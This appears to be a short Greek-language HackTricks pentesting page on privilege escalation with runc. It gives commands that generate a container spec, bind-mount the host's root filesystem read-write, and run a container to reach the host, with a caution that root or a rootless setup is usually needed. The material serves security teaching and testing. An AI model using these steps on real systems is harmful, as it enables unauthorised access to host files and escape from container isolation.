# Privilege Escalation με RunC

{{#include ../../banners/hacktricks-training.md}}

## Βασικές πληροφορίες

Αν θέλετε να μάθετε περισσότερα για το **runc**, δείτε την ακόλουθη σελίδα:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Αν διαπιστώσετε ότι το `runc` είναι εγκατεστημένο στο host, ενδέχεται να μπορείτε να **εκτελέσετε ένα container κάνοντας mount τον root / φάκελο του host**.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Αυτό δεν θα λειτουργεί πάντα, καθώς η προεπιλεγμένη λειτουργία του runc είναι η εκτέλεση ως root, επομένως η εκτέλεσή του από unprivileged user απλώς δεν μπορεί να λειτουργήσει (εκτός αν υπάρχει rootless configuration). Η καθιέρωση ενός rootless configuration ως προεπιλογής γενικά δεν είναι καλή ιδέα, επειδή υπάρχουν αρκετοί περιορισμοί μέσα σε rootless containers που δεν ισχύουν εκτός rootless containers.

{{#include ../../banners/hacktricks-training.md}}
